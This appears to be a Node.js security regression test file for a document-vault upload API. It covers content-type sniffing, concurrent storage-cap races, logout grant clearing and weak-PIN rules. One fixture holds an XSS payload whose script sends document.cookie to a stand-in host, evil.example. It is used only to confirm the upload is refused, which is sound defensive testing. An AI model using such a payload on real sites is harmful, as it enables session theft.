// The document vault's upload path, from the same security pass.
//
//  MEDIUM — the upload trusted the CLIENT-DECLARED content type. isAllowedMime
//  reads the Content-Type the caller wrote into the multipart part, and nothing
//  looked at the bytes. Demonstrated by storing an HTML page carrying a <script>
//  as "image/png" (served back inline from our own origin) and a Windows PE
//  executable as "application/pdf" (handed back as a .pdf attachment). The
//  stored XSS did not fire — the file route sets nosniff and runs under the
//  app's CSP — so this was a failed layer rather than a live hole, and it is now
//  corroborated against the actual container signature.
//
//  MEDIUM — both storage caps were check-then-write. 12 concurrent uploads
//  against a 6-per-vehicle cap stored 12; 15 concurrent 4MB uploads against a
//  40MB per-owner cap stored 60MB. Replaced with a conditional single-document
//  reservation, which is the only form that holds under concurrency.
//
//  LOW — signing out left the vault unlock grant behind; a PIN of "0000" was
//  accepted.
import test, { before, after, beforeEach, describe } from "node:test";
import assert from "node:assert/strict";

import { createSession } from "../lib/auth/session.js";
import { getVaultBucket } from "../lib/db/repositories.js";
import { MAX_BYTES_PER_OWNER, MAX_DOCS_PER_VEHICLE } from "../lib/core/vault.js";
import {
  startTestApp,
  stopTestApp,
  createTestOwner,
  purgeLoginCollections,
  uniqueAddress,
  assertUndeliverableIdentifier
} from "./helpers.js";

const OWNER_EMAIL = assertUndeliverableIdentifier("qa-vault-upload@parktag-test.invalid");
const VAULT_PIN = "5938";
const ORIGIN = "http://localhost:3000";
const BOUNDARY = "----vaultUploadBoundary";

// ── Fixtures: real container signatures, and things pretending to be them ────
const PNG = Buffer.from(
  "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000a4944415478" +
    "9c63000100000500010d0a2db40000000049454e44ae426082",
  "hex"
);
const JPEG = Buffer.from("ffd8ffe000104a46494600010100000100010000ffd9", "hex");
const PDF = Buffer.from("%PDF-1.4\n1 0 obj\n<<>>\nendobj\ntrailer\n<<>>\n%%EOF\n", "latin1");
const WEBP = Buffer.concat([
  Buffer.from("RIFF", "latin1"),
  Buffer.from([0x1a, 0x00, 0x00, 0x00]),
  Buffer.from("WEBPVP8 ", "latin1"),
  Buffer.alloc(14, 0)
]);
const HTML_XSS = Buffer.from(
  "<html><body><script>fetch('https://evil.example/?c='+document.cookie)</scr" +
    "ipt></body></html>",
  "latin1"
);
const WINDOWS_EXE = Buffer.concat([
  Buffer.from("MZ", "latin1"),
  Buffer.alloc(64, 0x90),
  Buffer.from("This program cannot be run in DOS mode", "latin1")
]);

let app;
let env;
let collections;
let bucket;
let owner;
let cookie;
let tagId;

function multipart(fields, file) {
  const parts = [];
  for (const [name, value] of Object.entries(fields)) {
    parts.push(
      Buffer.from(
        `--${BOUNDARY}\r\nContent-Disposition: form-data; name="${name}"\r\n\r\n${value}\r\n`
      )
    );
  }
  parts.push(
    Buffer.from(
      `--${BOUNDARY}\r\nContent-Disposition: form-data; name="file"; filename="${file.filename}"\r\n` +
        `Content-Type: ${file.contentType}\r\n\r\n`
    )
  );
  parts.push(file.body);
  parts.push(Buffer.from(`\r\n--${BOUNDARY}--\r\n`));
  return Buffer.concat(parts);
}

function call(method, url, { payload, sessionCookie } = {}) {
  return app.inject({
    method,
    url,
    remoteAddress: uniqueAddress(),
    cookies: { wavetag_session: sessionCookie || cookie },
    headers: { origin: ORIGIN },
    ...(payload === undefined ? {} : { payload })
  });
}

function upload({ body, contentType, filename = "doc", tag = tagId, docType = "rc" } = {}) {
  return app.inject({
    method: "POST",
    url: "/api/owner/vault/documents",
    remoteAddress: uniqueAddress(),
    cookies: { wavetag_session: cookie },
    headers: { origin: ORIGIN, "content-type": `multipart/form-data; boundary=${BOUNDARY}` },
    payload: multipart({ tagId: tag, docType, label: "QA" }, { filename, contentType, body })
  });
}

async function makeTag(plate, token) {
  const tag = await collections.tags.insertOne({
    ownerId: owner._id,
    plateNumber: plate,
    status: "active",
    token,
    createdAt: new Date().toISOString()
  });
  return String(tag.insertedId);
}

async function storedBytes() {
  const totals = await collections.vaultDocuments
    .aggregate([{ $match: { ownerId: owner._id } }, { $group: { _id: null, b: { $sum: "$size" } } }])
    .toArray();
  return (totals[0] && totals[0].b) || 0;
}

async function wipe() {
  await purgeLoginCollections(collections);
  await collections.tags.deleteMany({}).catch(() => {});
  await collections.vaultDocuments.deleteMany({}).catch(() => {});
  await collections.vaultGrants.deleteMany({}).catch(() => {});
  await collections.vaultUsage.deleteMany({}).catch(() => {});
  const files = await bucket.find({}).toArray();
  for (const f of files) await bucket.delete(f._id).catch(() => {});
}

before(async () => {
  ({ app, env, collections } = await startTestApp());
  bucket = await getVaultBucket(env);
});

after(async () => {
  await wipe();
  await stopTestApp(app);
});

beforeEach(async () => {
  await wipe();
  owner = await createTestOwner(collections, { email: OWNER_EMAIL });
  cookie = await createSession(app, {
    id: String(owner._id),
    role: "owner",
    email: owner.email,
    displayName: owner.displayName
  });
  tagId = await makeTag("QA01UP0001", "qa-vault-upload-0001");
  const pin = await call("POST", "/api/owner/vault/pin", { payload: { pin: VAULT_PIN } });
  assert.equal(pin.statusCode, 200, `precondition: PIN not set — ${pin.body}`);
});

describe("MEDIUM — the bytes must match the declared type", () => {
  test("a genuine PNG, JPEG, PDF and WEBP are all still accepted", async () => {
    const cases = [
      ["image/png", PNG, "rc.png"],
      ["image/jpeg", JPEG, "rc.jpg"],
      ["application/pdf", PDF, "rc.pdf"],
      ["image/webp", WEBP, "rc.webp"]
    ];
    for (const [contentType, body, filename] of cases) {
      const r = await upload({ body, contentType, filename, docType: "other" });
      assert.equal(r.statusCode, 200, `a real ${contentType} was refused: ${r.body}`);
    }
  });

  test("HTML carrying a script, declared as image/png, is refused", async () => {
    const r = await upload({ body: HTML_XSS, contentType: "image/png", filename: "payload.html" });
    assert.equal(r.statusCode, 415, `expected 415, got ${r.statusCode}: ${r.body}`);
    assert.equal(await collections.vaultDocuments.countDocuments({}), 0);
  });

  test("a Windows executable, declared as application/pdf, is refused", async () => {
    const r = await upload({ body: WINDOWS_EXE, contentType: "application/pdf", filename: "setup.exe" });
    assert.equal(r.statusCode, 415, `expected 415, got ${r.statusCode}: ${r.body}`);
  });

  test("a refused upload leaves nothing behind in storage", async () => {
    await upload({ body: HTML_XSS, contentType: "image/png", filename: "x.png" });
    assert.equal(
      (await bucket.find({}).toArray()).length,
      0,
      "the rejected upload's bytes were left in GridFS"
    );
    assert.equal(await collections.vaultUsage.countDocuments({ bytes: { $gt: 0 } }), 0,
      "a rejected upload still consumed the owner's storage allowance");
  });

  test("a PNG's bytes under a JPEG's declared type are refused", async () => {
    // The mismatch that matters is content vs declaration, not "is it an image".
    const r = await upload({ body: PNG, contentType: "image/jpeg", filename: "rc.jpg" });
    assert.equal(r.statusCode, 415, `expected 415, got ${r.statusCode}`);
  });

  test("an empty file is refused rather than stored as a zero-byte document", async () => {
    const r = await upload({ body: Buffer.alloc(0), contentType: "image/png", filename: "empty.png" });
    assert.equal(r.statusCode, 415, `expected 415, got ${r.statusCode}`);
  });

  test("a PDF with leading bytes before its header is still accepted", async () => {
    // The spec tolerates this and real scanners emit it, so the sniff searches
    // the first 1024 bytes rather than demanding offset 0.
    const padded = Buffer.concat([Buffer.alloc(200, 0x20), PDF]);
    const r = await upload({ body: padded, contentType: "application/pdf", filename: "scan.pdf" });
    assert.equal(r.statusCode, 200, `a real-world PDF was refused: ${r.body}`);
  });

  test("a file hiding its PDF header past the sniff window is refused", async () => {
    const hidden = Buffer.concat([Buffer.alloc(2048, 0x41), PDF]);
    const r = await upload({ body: hidden, contentType: "application/pdf", filename: "sneaky.pdf" });
    assert.equal(r.statusCode, 415, `expected 415, got ${r.statusCode}`);
  });
});

describe("MEDIUM — the storage caps hold under concurrent uploads", () => {
  test(`${MAX_DOCS_PER_VEHICLE + 6} concurrent uploads store exactly ${MAX_DOCS_PER_VEHICLE}`, async () => {
    const attempts = MAX_DOCS_PER_VEHICLE + 6;
    const responses = await Promise.all(
      Array.from({ length: attempts }, () =>
        upload({ body: PNG, contentType: "image/png", filename: "rc.png" })
      )
    );

    const accepted = responses.filter((r) => r.statusCode === 200).length;
    const refused = responses.filter((r) => r.statusCode === 409).length;
    const stored = await collections.vaultDocuments.countDocuments({ tagId });

    assert.equal(stored, MAX_DOCS_PER_VEHICLE, `${stored} documents stored against a cap of ${MAX_DOCS_PER_VEHICLE}`);
    assert.equal(accepted, MAX_DOCS_PER_VEHICLE, `${accepted} uploads were accepted`);
    assert.equal(refused, attempts - MAX_DOCS_PER_VEHICLE, "the excess uploads were not refused with 409");
    assert.equal(
      (await bucket.find({}).toArray()).length,
      MAX_DOCS_PER_VEHICLE,
      "rolled-back uploads left their bytes in GridFS"
    );
  });

  test("a burst larger than the whole allowance cannot exceed it", async () => {
    // 12 x 4MB = 48MB against a 40MB cap, spread over three vehicles so the
    // per-vehicle cap is not what stops it. This is the exact shape that stored
    // 60MB before the reservation existed.
    const CHUNK = 4 * 1024 * 1024;
    const big = Buffer.alloc(CHUNK, 0x42);
    PNG.copy(big, 0, 0, 8); // keep a valid PNG signature

    const tags = [tagId, await makeTag("QA01UP0002", "qa-vault-upload-0002"), await makeTag("QA01UP0003", "qa-vault-upload-0003")];

    const responses = await Promise.all(
      Array.from({ length: 12 }, (_, i) =>
        upload({ body: big, contentType: "image/png", filename: `b${i}.png`, tag: tags[i % tags.length], docType: "other" })
      )
    );

    const accepted = responses.filter((r) => r.statusCode === 200).length;
    const used = await storedBytes();

    assert.ok(
      used <= MAX_BYTES_PER_OWNER,
      `${(used / 1024 / 1024).toFixed(1)}MB stored against a ${MAX_BYTES_PER_OWNER / 1024 / 1024}MB cap`
    );
    assert.equal(accepted, Math.floor(MAX_BYTES_PER_OWNER / CHUNK), "the allowance was not filled exactly once");
    assert.equal(
      (await bucket.find({}).toArray()).length,
      accepted,
      "refused uploads left their bytes in GridFS"
    );
  });

  test("an owner who already had documents is counted from what they hold", async () => {
    // No usage row exists for an owner from before this collection, so the
    // first reservation has to seed it from the real documents or the cap
    // would restart from zero. Stand one up directly to model that owner.
    const otherTag = await makeTag("QA01UP0004", "qa-vault-upload-0004");
    await collections.vaultDocuments.insertOne({
      docId: "legacy0000000000000000000000000a",
      ownerId: owner._id,
      tagId: otherTag,
      docType: "rc",
      label: "Legacy",
      mimeType: "image/png",
      size: MAX_BYTES_PER_OWNER - 10,
      thumb: null,
      fileId: null,
      createdAt: new Date().toISOString()
    });
    assert.equal(await collections.vaultUsage.countDocuments({}), 0, "precondition: a usage row already existed");

    const r = await upload({ body: PNG, contentType: "image/png", filename: "rc.png" });
    assert.equal(r.statusCode, 409, `expected 409, got ${r.statusCode}: ${r.body}`);
    assert.match(JSON.parse(r.body).error, /storage/i);
  });

  test("deleting a document gives the space back", async () => {
    const first = await upload({ body: PNG, contentType: "image/png", filename: "rc.png" });
    assert.equal(first.statusCode, 200, first.body);
    const docId = JSON.parse(first.body).document.id;

    const before = await collections.vaultUsage.findOne({ _id: String(owner._id) });
    assert.ok(before.bytes > 0, "the upload did not reserve anything");

    const del = await call("DELETE", `/api/owner/vault/documents/${docId}`);
    assert.equal(del.statusCode, 200, del.body);

    const after = await collections.vaultUsage.findOne({ _id: String(owner._id) });
    assert.equal(after.bytes, 0, "deleting a document did not release its bytes");
    assert.equal(after.tags[tagId], 0, "deleting a document did not release its vehicle slot");
  });

  test("the freed slot can be used again", async () => {
    const ids = [];
    for (let i = 0; i < MAX_DOCS_PER_VEHICLE; i += 1) {
      const r = await upload({ body: PNG, contentType: "image/png", filename: `d${i}.png` });
      assert.equal(r.statusCode, 200, r.body);
      ids.push(JSON.parse(r.body).document.id);
    }

    const full = await upload({ body: PNG, contentType: "image/png", filename: "over.png" });
    assert.equal(full.statusCode, 409, "the per-vehicle cap did not hold on the serial path");

    await call("DELETE", `/api/owner/vault/documents/${ids[0]}`);

    const retry = await upload({ body: PNG, contentType: "image/png", filename: "again.png" });
    assert.equal(retry.statusCode, 200, `a freed slot could not be reused: ${retry.body}`);
  });

  test("deleting a vehicle gives its whole allowance back", async () => {
    for (let i = 0; i < 3; i += 1) {
      const r = await upload({ body: PNG, contentType: "image/png", filename: `d${i}.png` });
      assert.equal(r.statusCode, 200, r.body);
    }

    await call("DELETE", `/api/owner/tags/${tagId}`);

    const usage = await collections.vaultUsage.findOne({ _id: String(owner._id) });
    assert.equal(usage.bytes, 0, "a deleted vehicle's bytes are still reserved");
    assert.equal(usage.tags[tagId], 0, "a deleted vehicle's slots are still reserved");
  });
});

describe("LOW — signing out, and predictable PINs", () => {
  test("logging out clears the vault unlock grant", async () => {
    await call("POST", "/api/owner/vault/unlock", { payload: { pin: VAULT_PIN } });
    assert.equal(await collections.vaultGrants.countDocuments({}), 1, "precondition: no grant to clear");

    const out = await call("POST", "/api/auth/logout");
    assert.equal(out.statusCode, 200, out.body);
    assert.equal(
      await collections.vaultGrants.countDocuments({}),
      0,
      "signing out left an unlocked-vault grant behind"
    );
  });

  test("a repeated-digit or sequential PIN is refused", async () => {
    for (const pin of ["0000", "1111", "999999", "1234", "4321", "345678"]) {
      const r = await call("POST", "/api/owner/vault/pin", {
        payload: { pin, currentPin: VAULT_PIN }
      });
      assert.equal(r.statusCode, 400, `PIN "${pin}" was accepted`);
      assert.match(JSON.parse(r.body).error, /predictable/i);
    }
  });

  test("an ordinary PIN is still accepted", async () => {
    const r = await call("POST", "/api/owner/vault/pin", {
      payload: { pin: "5271", currentPin: VAULT_PIN }
    });
    assert.equal(r.statusCode, 200, `a reasonable PIN was refused: ${r.body}`);
  });

  test("a PIN that merely zigzags is not treated as a run", async () => {
    // 4543 steps by -1, +1, -1. An earlier draft of the rule refused it, which
    // told the owner to avoid "runs like 1234" about a PIN that is not a run.
    const r = await call("POST", "/api/owner/vault/pin", {
      payload: { pin: "4543", currentPin: VAULT_PIN }
    });
    assert.equal(r.statusCode, 200, `a non-sequential PIN was refused: ${r.body}`);
  });

  test("an owner whose existing PIN is weak can still unlock with it", async () => {
    // The rule applies to SETTING a PIN. Applying it to verification would lock
    // out every owner who already has one on the day this deploys.
    await collections.vaultGrants.deleteMany({});
    const weakOwner = await createTestOwner(collections, {
      email: assertUndeliverableIdentifier("qa-vault-weak@parktag-test.invalid")
    });
    const weakCookie = await createSession(app, {
      id: String(weakOwner._id),
      role: "owner",
      email: weakOwner.email,
      displayName: weakOwner.displayName
    });
    // Set directly, as a pre-existing record would have been.
    const { setVaultPin } = await import("../lib/core/vault.js");
    await setVaultPin(collections, weakOwner._id, "0000");

    const unlock = await call("POST", "/api/owner/vault/unlock", {
      payload: { pin: "0000" },
      sessionCookie: weakCookie
    });
    assert.equal(unlock.statusCode, 200, `an existing weak PIN stopped working: ${unlock.body}`);
  });
});
